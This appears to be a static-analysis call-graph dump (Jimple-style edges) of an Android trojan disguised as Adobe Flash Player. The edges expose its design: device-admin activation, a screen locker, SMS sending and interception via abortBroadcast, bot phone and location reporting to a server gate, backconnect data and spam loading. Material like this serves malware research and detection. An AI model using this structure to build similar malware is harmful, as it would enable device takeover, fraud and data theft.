VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r13 = virtualinvoke $r15.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=0&b=") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>("android.app.extra.DEVICE_ADMIN", r3) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,android.os.Parcelable)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("Off") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "NONLOCK", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)> ==> <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r19) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296259) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("w", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r18 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>($r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r17.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: void <init>()>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.flashplayer_.FlashARM: void <init>()> ==> <android.app.Activity: void <init>()>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.SystemSWF: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "NONLOCK", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r2 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.admin.DeviceAdminReceiver: void onEnabled(android.content.Context,android.content.Intent)>($r1, $r2) in <com.adobe.flashplayer_.ADOBEcoreZa: void onEnabled(android.content.Context,android.content.Intent)> ==> <android.app.admin.DeviceAdminReceiver: void onEnabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("loadSpam") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: void setContentView(int)>(2130903041) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: boolean requestWindowFeature(int)>(1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\nDebug: ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r15.<java.lang.StringBuilder: void <init>(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Action: ") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r25, "in.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r24, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onDestroy()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>("A", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r24, "backconnect_data.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
